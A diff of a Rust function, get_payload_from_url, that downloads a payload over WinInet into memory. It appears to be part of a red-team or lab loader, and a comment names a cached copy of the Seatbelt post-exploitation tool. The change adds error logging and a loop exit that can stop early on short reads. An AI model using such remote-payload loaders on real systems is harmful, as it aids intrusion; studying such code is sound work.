@@ -1,16 +1,12 @@
-use std::ffi::c_void;
+use std::{ffi::c_void, fmt::Display};
 
 use windows::Win32::{
-    Foundation::{GENERIC_READ, S_OK},
+    Foundation::{GetLastError, GENERIC_READ, S_OK},
     Networking::WinInet::{
-        INTERNET_BUFFERSA, INTERNET_BUFFERSW, INTERNET_FLAG_KEEP_CONNECTION,
-        INTERNET_OPEN_TYPE_PRECONFIG, IRF_ASYNC, IRF_SYNC, InternetCloseHandle, InternetOpenUrlW,
-        InternetOpenW, InternetReadFile, InternetReadFileExA, InternetReadFileExW,
-        WININET_API_FLAG_SYNC,
+        InternetCloseHandle, InternetOpenUrlW, InternetOpenW, InternetReadFile, InternetReadFileExA, InternetReadFileExW, INTERNET_BUFFERSA, INTERNET_BUFFERSW, INTERNET_FLAG_KEEP_CONNECTION, INTERNET_OPEN_TYPE_PRECONFIG, IRF_ASYNC, IRF_SYNC, WININET_API_FLAG_SYNC
     },
     Storage::FileSystem::{
-        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_CREATION_DISPOSITION, FILE_SHARE_READ,
-        GetFileSizeEx, ReadFileEx,
+        CreateFileW, GetFileSizeEx, ReadFileEx, FILE_ATTRIBUTE_NORMAL, FILE_CREATION_DISPOSITION, FILE_SHARE_READ
     },
     System::IO::OVERLAPPED,
 };
@@ -47,6 +43,7 @@ const BUFFER_SIZE: usize = 4096;
 pub fn get_payload_from_url<T: AsRef<str>>(url: T) -> Vec<u8>
 where
     BSTR: From<T>,
+    T: std::fmt::Display + Clone,
 {
     let handle_open = unsafe {
         InternetOpenW(
@@ -58,19 +55,29 @@ where
         )
     };
 
+    if handle_open.is_null() {
+        println!("InternetOpenW failed. {:?}", unsafe {GetLastError()});
+    }
+
     let handle_url = unsafe {
         InternetOpenUrlW(
             handle_open,
-            PCWSTR::from_raw(BSTR::from(url).into_raw()),
+            PCWSTR::from_raw(BSTR::from(url.clone()).into_raw()),
             None,
             INTERNET_FLAG_KEEP_CONNECTION,
             None,
         )
     };
 
+    if handle_url.is_null() {
+        println!("InternetOpenUrlW failed. {:?} url: {}", unsafe {GetLastError()}, url.clone());
+    }
     let mut buf = vec![];
     let mut read_count = 0_u32;
 
+    // TODO 
+    // file saved location
+    //file: C:\Users\lab\AppData\Local\Microsoft\Windows\INetCache\IE\GX1L0OEV\Seatbelt[1].exe
     loop {
         let mut tmp_buf = vec![0_u8; BUFFER_SIZE];
         unsafe {
@@ -86,7 +93,7 @@ where
         tmp_buf.shrink_to(read_count as usize);
         buf.push(tmp_buf);
 
-        if read_count == 0 {
+        if read_count < BUFFER_SIZE as u32 {
             break;
         }
     }
